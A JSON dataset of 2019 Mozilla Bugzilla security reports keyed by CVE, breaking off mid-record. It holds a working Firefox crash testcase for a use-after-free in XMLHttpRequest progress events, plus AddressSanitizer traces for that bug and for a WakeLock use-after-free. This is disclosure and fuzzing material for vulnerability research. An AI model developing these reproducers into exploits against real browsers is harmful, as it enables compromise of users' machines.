{
  "year": 2019,
  "total": 73,
  "reference": "bugzilla.mozilla.org",
  "reports": {
    "CVE-2019-11691": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1542465",
        "title": "use-after-free in mozilla::dom::XMLHttpRequestMainThread::DispatchProgressEvent",
        "description": "The following testcase crashes the latest ASAN build of Firefox 68.0a1 (SourceStamp=93075ec49df3982c26873b822d762bd3d8863fad). It requires a fuzzing build (--enable-fuzzing) and the pref user_pref(\"fuzzing.enabled\",true). I am using a Python2 webserver (python -m SimpleHTTPServer) to host the testcase. crash.html: <script> function spin() { var x=new XMLHttpRequest(); x.open(\"POST\",\"https://mozilla.org/\",false); try{x.send(\"X\");}catch(e){} } function start() { o305=document.documentElement; o339=new XMLHttpRequest(); o1155=new XMLHttpRequest(); o339.open('GET','/a'+ \"a\".repeat(204811),true); o339.onreadystatechange=fun0; o339.send(undefined); o1537=o1155.upload; o1537.onprogress=fun1; } function fun0() { o1155.open('POST','/x' + \"a\".repeat(204811),true); o1155.send(o305); } function fun1() { window.dump(1); o1155.open('GET','/a'+'a'.repeat(101111),true); o1155.send(undefined); for(var x=0;x<10;x++) spin(); o1155 = null; o1537 = null; o339 = null; o305 = null; FuzzingFunctions.garbageCollect();FuzzingFunctions.cycleCollect();FuzzingFunctions.garbageCollect();FuzzingFunctions.cycleCollect(); } </script> <body onload=\"start()\"></body> ASAN output: ==20801==ERROR: AddressSanitizer: heap-use-after-free on address 0x6170000c26c3 at pc 0x7f8f0918abbb bp 0x7ffe0541f310 sp 0x7ffe0541f308 WRITE of size 1 at 0x6170000c26c3 thread T0 (Web Content) #0 0x7f8f0918abba in mozilla::dom::XMLHttpRequestMainThread::DispatchProgressEvent(mozilla::DOMEventTargetHelper*, mozilla::dom::XMLHttpRequestMainThread::ProgressEventType, long, long) /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:1227:26 #1 0x7f8f091b3430 in mozilla::dom::XMLHttpRequestMainThread::HandleProgressTimerCallback() /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp #2 0x7f8f091b2e60 in mozilla::dom::XMLHttpRequestMainThread::Notify(nsITimer*) /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:3400:5 #3 0x7f8efee5dc51 in nsTimerImpl::Fire(int) /builds/worker/workspace/build/src/xpcom/threads/nsTimerImpl.cpp:562:40 #4 0x7f8efee5cfba in nsTimerEvent::Run() /builds/worker/workspace/build/src/xpcom/threads/TimerThread.cpp:260:11 #5 0x7f8efee35a15 in mozilla::SchedulerGroup::Runnable::Run() /builds/worker/workspace/build/src/xpcom/threads/SchedulerGroup.cpp:295:32 #6 0x7f8efee75a56 in nsThread::ProcessNextEvent(bool, bool*) /builds/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1180:14 #7 0x7f8efee7d71d in NS_ProcessNextEvent(nsIThread*, bool) /builds/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:486:10 #8 0x7f8f001df7c4 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /builds/worker/workspace/build/src/ipc/glue/MessagePump.cpp:110:5 #9 0x7f8f000b4a9e in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #10 0x7f8f000b4a9e in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #11 0x7f8f000b4a9e in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #12 0x7f8f096a21b3 in nsBaseAppShell::Run() /builds/worker/workspace/build/src/widget/nsBaseAppShell.cpp:137:27 #13 0x7f8f0dc6798e in XRE_RunAppShell() /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:919:20 #14 0x7f8f000b4a9e in RunInternal /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:315:10 #15 0x7f8f000b4a9e in RunHandler /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:308 #16 0x7f8f000b4a9e in MessageLoop::Run() /builds/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:290 #17 0x7f8f0dc66b1c in XRE_InitChildProcess(int, char**, XREChildData const*) /builds/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:757:34 #18 0x5645a6183834 in content_process_main /builds/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:56:28 #19 0x5645a6183834 in main /builds/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:263 #20 0x7f8f22d88b96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310 #21 0x5645a60a8ebc in _start (/home/nils/browser/firefox/firefox/firefox+0x2debc) 0x6170000c26c3 is located 579 bytes inside of 688-byte region [0x6170000c2480,0x6170000c2730) freed by thread T0 (Web Content) here: #0 0x5645a61509e2 in free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:124:3 #1 0x7f8efec38751 in SnowWhiteKiller::~SnowWhiteKiller() /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2416:7 #2 0x7f8efec36e03 in nsCycleCollector::FreeSnowWhite(bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2607:3 #3 0x7f8efec437e2 in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3582:3 #4 0x7f8efec42a75 in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3411:9 #5 0x7f8efec47b16 in nsCycleCollector_collect(nsICycleCollectorListener*) /builds/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3947:21 #6 0x7f8f036c0b8a in nsJSContext::CycleCollectNow(nsICycleCollectorListener*) /builds/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1413:3 #7 0x7f8f0604ef69 in mozilla::dom::FuzzingFunctions_Binding::cycleCollect(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/FuzzingFunctionsBinding.cpp:66:3 #8 0x7f8f0df517c7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13 #9 0x7f8f0df517c7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534 #10 0x7f8f0f118e1d in js::jit::DoCallFallback(JSContext*, js::jit::BaselineFrame*, js::jit::ICCall_Fallback*, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jit/BaselineIC.cpp:3858:10 #11 0x1cf31cd64887 (<unknown module>) #12 0x6210006391ff (<unknown module>) #13 0x1cf31cd624de (<unknown module>) #14 0x7f8f0f30f641 in EnterBaseline /builds/worker/workspace/build/src/js/src/jit/BaselineJIT.cpp:111:5 #15 0x7f8f0f30f641 in js::jit::EnterBaselineAtBranch(JSContext*, js::InterpreterFrame*, unsigned char*) /builds/worker/workspace/build/src/js/src/jit/BaselineJIT.cpp:189 #16 0x7f8f0df41b4d in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:1982:24 #17 0x7f8f0df1bbe8 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10 #18 0x7f8f0df52138 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:562:13 #19 0x7f8f0df53d82 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:605:8 #20 0x7f8f0eb99e99 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2621:10 #21 0x7f8f05d44e10 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:266:37 #22 0x7f8f07014df2 in Call<nsCOMPtr<mozilla::dom::EventTarget> > /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:363:12 #23 0x7f8f07014df2 in mozilla::JSEventHandler::HandleEvent(mozilla::dom::Event*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:205 #24 0x7f8f06fc4c4a in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1045:22 #25 0x7f8f06fc7281 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1240:17 #26 0x7f8f06fa73f0 in HandleEvent /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventListenerManager.h:355:5 #27 0x7f8f06fa73f0 in mozilla::EventTargetChainItem::HandleEvent(mozilla::EventChainPostVisitor&, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:349 #28 0x7f8f06fa5618 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:551:16 #29 0x7f8f06fac383 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:1046:11 #30 0x7f8f06fb40a6 in mozilla::EventDispatcher::DispatchDOMEvent(nsISupports, mozilla::WidgetEvent*, mozilla::dom::Event*, nsPresContext*, nsEventStatus*) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp #31 0x7f8f06f5e770 in mozilla::DOMEventTargetHelper::DispatchEvent(mozilla::dom::Event&, mozilla::dom::CallerType, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/events/DOMEventTargetHelper.cpp:166:17 #32 0x7f8f06fd9b8a in mozilla::dom::EventTarget::DispatchEvent(mozilla::dom::Event&) /builds/worker/workspace/build/src/dom/events/EventTarget.cpp:178:13 #33 0x7f8f0918a909 in mozilla::dom::XMLHttpRequestMainThread::DispatchProgressEvent(mozilla::DOMEventTargetHelper*, mozilla::dom::XMLHttpRequestMainThread::ProgressEventType, long, long) /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:1224:3 previously allocated by thread T0 (Web Content) here: #0 0x5645a6150d63 in __interceptor_malloc /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:146:3 #1 0x5645a61855fd in moz_xmalloc /builds/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:68:15 #2 0x7f8f09179593 in operator new /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:131:10 #3 0x7f8f09179593 in mozilla::dom::XMLHttpRequest::Constructor(mozilla::dom::GlobalObject const&, mozilla::dom::MozXMLHttpRequestParameters const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequest.cpp:45 #4 0x7f8f059d5cbc in mozilla::dom::XMLHttpRequest_Binding::_constructor(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/XMLHttpRequestBinding.cpp:2553:64 #5 0x7f8f0df54a2f in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13 #6 0x7f8f0df54a2f in CallJSNativeConstructor /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:458 #7 0x7f8f0df54a2f in InternalConstruct(JSContext*, js::AnyConstructArgs const&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:651 #8 0x7f8f0df399af in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3066:16 #9 0x7f8f0df1bbe8 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10 #10 0x7f8f0df52138 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:562:13 #11 0x7f8f0df53d82 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:605:8 #12 0x7f8f0eb99e99 in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jsapi.cpp:2621:10 #13 0x7f8f05d44e10 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:266:37 #14 0x7f8f07014df2 in Call<nsCOMPtr<mozilla::dom::EventTarget> > /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:363:12 #15 0x7f8f07014df2 in mozilla::JSEventHandler::HandleEvent(mozilla::dom::Event*) /builds/worker/workspace/build/src/dom/events/JSEventHandler.cpp:205 #16 0x7f8f06fc4c4a in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, mozilla::dom::Event*, mozilla::dom::EventTarget*) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1045:22 #17 0x7f8f06fc7223 in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event**, mozilla::dom::EventTarget*, nsEventStatus*, bool) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1240:17 #18 0x7f8f06fa73f0 in HandleEvent /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventListenerManager.h:355:5 #19 0x7f8f06fa73f0 in mozilla::EventTargetChainItem::HandleEvent(mozilla::EventChainPostVisitor&, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:349 #20 0x7f8f06fa5618 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:551:16 #21 0x7f8f06fac383 in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, mozilla::dom::Event*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>) /builds/worker/workspace/build/src/dom/events/EventDispatcher.cpp:1046:11 #22 0x7f8f09f589ba in nsDocumentViewer::LoadComplete(nsresult) /builds/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1098:7 #23 0x7f8f0cdc3d8c in nsDocShell::EndPageLoad(nsIWebProgress, nsIChannel*, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6596:21 #24 0x7f8f0cdc2eb8 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp:6397:7 #25 0x7f8f0cdc8a27 in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /builds/worker/workspace/build/src/docshell/base/nsDocShell.cpp #26 0x7f8f01a51c25 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1313:3 #27 0x7f8f01a5080c in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:872:14 #28 0x7f8f01a4b957 in nsDocLoader::DocLoaderIsEmpty(bool) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:710:9 #29 0x7f8f01a4ea55 in nsDocLoader::OnStopRequest(nsIRequest*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:598:5 #30 0x7f8f01a50334 in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsresult) /builds/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp #31 0x7f8eff11e6b2 in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /builds/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:568:22 #32 0x7f8f032f68ca in DoUnblockOnload /builds/worker/workspace/build/src/dom/base/Document.cpp:7821:18 #33 0x7f8f032f68ca in mozilla::dom::Document::UnblockOnload(bool) /builds/worker/workspace/build/src/dom/base/Document.cpp:7753 #34 0x7f8f032f532f in mozilla::dom::Document::DispatchContentLoadedEvents() /builds/worker/workspace/build/src/dom/base/Document.cpp:4873:3 #35 0x7f8f033fa8db in applyImpl<mozilla::dom::Document, void (mozilla::dom::Document::)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1122:12 #36 0x7f8f033fa8db in apply<mozilla::dom::Document, void (mozilla::dom::Document::)()> /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1128 #37 0x7f8f033fa8db in mozilla::detail::RunnableMethodImpl<mozilla::dom::Document*, void (mozilla::dom::Document::*)(), true, (mozilla::RunnableKind)0>::Run() /builds/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:1174 SUMMARY: AddressSanitizer: heap-use-after-free /builds/worker/workspace/build/src/dom/xhr/XMLHttpRequestMainThread.cpp:1227:26 in mozilla::dom::XMLHttpRequestMainThread::DispatchProgressEvent(mozilla::DOMEventTargetHelper*, mozilla::dom::XMLHttpRequestMainThread::ProgressEventType, long, long) Shadow bytes around the buggy address: 0x0c2e80010480: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2e80010490: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e800104a0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e800104b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e800104c0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd =>0x0c2e800104d0: fd fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd 0x0c2e800104e0: fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa fa 0x0c2e800104f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c2e80010500: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e80010510: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c2e80010520: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb Shadow gap: cc ==20801==ABORTING"
      }
    ],
    "CVE-2019-11692": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1544670",
        "title": "heap-use-after-free in mozilla::dom::WakeLock::Release",
        "description": "I have seen the following crash a few times while fuzzing Firefo 68.0a1, however currently am unable to reproduce reliably. I will continue to try to minimize a testcase. ================================================================= ==6682==ERROR: AddressSanitizer: heap-use-after-free on address 0x608000018378 at pc 0x7fb01ea64c44 bp 0x7fffce9e4e60 sp 0x7fffce9e4e58 READ of size 8 at 0x608000018378 thread T0 (Web Content) #0 0x7fb01ea64c43 in ~nsCOMPtr_base /builds/worker/workspace/build/src/obj-firefox/dist/include/nsCOMPtr.h:330:9 #1 0x7fb01ea64c43 in mozilla::dom::WakeLock::~WakeLock() /builds/worker/workspace/build/src/dom/power/WakeLock.cpp:42 #2 0x7fb01ea656a8 in mozilla::dom::WakeLock::~WakeLock() /builds/worker/workspace/build/src/dom/power/WakeLock.cpp:39:23 #3 0x7fb01ea643fc in mozilla::dom::WakeLock::Release() /builds/worker/workspace/build/src/dom/power/WakeLock.cpp:32:1 #4 0x7fb01d6bb736 in UnlinkSelf /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/CallbackObject.h:528:5 #5 0x7fb01d6bb736 in ~CallbackObjectHolder /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/CallbackObject.h:406 #6 0x7fb01d6bb736 in ~Listener /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventListenerManager.h:233 #7 0x7fb01d6bb736 in Destruct /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:525 #8 0x7fb01d6bb736 in DestructRange /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2183 #9 0x7fb01d6bb736 in nsTArray_Impl<mozilla::EventListenerManager::Listener, nsTArrayInfallibleAllocator>::RemoveElementsAtUnsafe(unsigned long, unsigned long) /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2242 #10 0x7fb01d65d24e in RemoveElementsAt /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2236:3 #11 0x7fb01d65d24e in RemoveElementAt /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1698 #12 0x7fb01d65d24e in RemoveElementAt /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTObserverArray.h:208 #13 0x7fb01d65d24e in mozilla::EventListenerManager::RemoveAllListeners() /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1717 #14 0x7fb01db9c059 in nsHTMLDocument::Open(mozilla::dom::Optional<nsTSubstring<char16_t> > const&, nsTSubstring<char16_t> const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:1269:12 #15 0x7fb01db9eef3 in nsHTMLDocument::WriteCommon(nsTSubstring<char16_t> const&, bool, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:1530:5 #16 0x7fb01db9e11d in nsHTMLDocument::WriteCommon(mozilla::dom::Sequence<nsTString<char16_t> > const&, bool, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:1456:5 #17 0x7fb01c8205e1 in mozilla::dom::HTMLDocument_Binding::write(JSContext*, JS::Handle<JSObject*>, nsHTMLDocument*, JSJitMethodCallArgs const&) /builds/worker/workspace/build/src/obj-firefox/dom/bindings/HTMLDocumentBinding.cpp:397:9 #18 0x7fb01cdd3ac1 in bool mozilla::dom::binding_detail::GenericMethod<mozilla::dom::binding_detail::NormalThisPolicy, mozilla::dom::binding_detail::ThrowExceptions>(JSContext*, unsigned int, JS::Value*) /builds/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:3153:13 #19 0x7fb0245f5bf7 in CallJSNative /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:442:13 #20 0x7fb0245f5bf7 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:534 #21 0x7fb0245de3ef in CallFromStack /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:593:10 #22 0x7fb0245de3ef in Interpret(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:3072 #23 0x7fb0245c0368 in js::RunScript(JSContext*, js::RunState&) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:422:10 #24 0x7fb0245fb449 in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::AbstractFramePtr, JS::Value*) /builds/worker/workspace/build/src/js/src/vm/Interpreter.cpp:781:13 #25 0x7fb0246f1a37 in EvalKernel(JSContext*, JS::Handle<JS::Value>, EvalType, js::AbstractFramePtr, JS::Handle<JSObject*>, unsigned char*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/builtin/Eval.cpp:326:10 #26 0x7fb0246f3e04 in js::DirectEval(JSContext*, JS::Handle<JS::Value>, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/builtin/Eval.cpp:440:10 #27 0x7fb0257f51e4 in js::jit::DoCallFallback(JSContext*, js::jit::BaselineFrame*, js::jit::ICCall_Fallback*, unsigned int, JS::Value*, JS::MutableHandle<JS::Value>) /builds/worker/workspace/build/src/js/src/jit/BaselineIC.cpp:3866:10 #28 0x287384819887 (<unknown module>) 0x608000018378 is located 88 bytes inside of 96-byte region [0x608000018320,0x608000018380) freed by thread T0 (Web Content) here: #0 0x55acbf8359e2 in free /builds/worker/workspace/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:124:3 #1 0x7fb01ea643fc in mozilla::dom::WakeLock::Release() /builds/worker/workspace/build/src/dom/power/WakeLock.cpp:32:1 #2 0x7fb01d64c7d7 in UnlinkSelf /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/CallbackObject.h:528:5 #3 0x7fb01d64c7d7 in ~CallbackObjectHolder /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/CallbackObject.h:406 #4 0x7fb01d64c7d7 in mozilla::EventListenerManager::RemoveEventListenerByType(mozilla::dom::CallbackObjectHolder<mozilla::dom::EventListener, nsIDOMEventListener>, nsTSubstring<char16_t> const&, mozilla::EventListenerFlags const&) /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:696 #5 0x7fb01d666eaf in RemoveEventListenerByType /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventListenerManager.h:300:5 #6 0x7fb01d666eaf in mozilla::dom::EventTarget::RemoveSystemEventListener(nsTSubstring<char16_t> const&, nsIDOMEventListener*, bool) /builds/worker/workspace/build/src/dom/events/EventTarget.cpp:133 #7 0x7fb01ea650af in mozilla::dom::WakeLock::DetachEventListener() /builds/worker/workspace/build/src/dom/power/WakeLock.cpp:174:12 #8 0x7fb01ea64b2b in mozilla::dom::WakeLock::~WakeLock() /builds/worker/workspace/build/src/dom/power/WakeLock.cpp:41:3 #9 0x7fb01ea656a8 in mozilla::dom::WakeLock::~WakeLock() /builds/worker/workspace/build/src/dom/power/WakeLock.cpp:39:23 #10 0x7fb01ea643fc in mozilla::dom::WakeLock::Release() /builds/worker/workspace/build/src/dom/power/WakeLock.cpp:32:1 #11 0x7fb01d6bb736 in UnlinkSelf /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/CallbackObject.h:528:5 #12 0x7fb01d6bb736 in ~CallbackObjectHolder /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/CallbackObject.h:406 #13 0x7fb01d6bb736 in ~Listener /builds/worker/workspace/build/src/obj-firefox/dist/include/mozilla/EventListenerManager.h:233 #14 0x7fb01d6bb736 in Destruct /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:525 #15 0x7fb01d6bb736 in DestructRange /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2183 #16 0x7fb01d6bb736 in nsTArray_Impl<mozilla::EventListenerManager::Listener, nsTArrayInfallibleAllocator>::RemoveElementsAtUnsafe(unsigned long, unsigned long) /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2242 #17 0x7fb01d65d24e in RemoveElementsAt /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:2236:3 #18 0x7fb01d65d24e in RemoveElementAt /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTArray.h:1698 #19 0x7fb01d65d24e in RemoveElementAt /builds/worker/workspace/build/src/obj-firefox/dist/include/nsTObserverArray.h:208 #20 0x7fb01d65d24e in mozilla::EventListenerManager::RemoveAllListeners() /builds/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1717 #21 0x7fb01db9c059 in nsHTMLDocument::Open(mozilla::dom::Optional<nsTSubstring<char16_t> > const&, nsTSubstring<char16_t> const&, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:1269:12 #22 0x7fb01db9eef3 in nsHTMLDocument::WriteCommon(nsTSubstring<char16_t> const&, bool, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:1530:5 #23 0x7fb01db9e11d in nsHTMLDocument::WriteCommon(mozilla::dom::Sequence<nsTString<char16_t> > const&, bool, mozilla::ErrorResult&) /builds/worker/workspace/build/src/dom/html/nsHTMLDocument.cpp:1456:5 #24 0x7fb01c8205e1 in mozilla::dom::HTMLDocument_Binding::write(JSContext*, JS::Handle<JSObject*>, nsHTMLDocument*, JSJitMethodCallArgs const&) 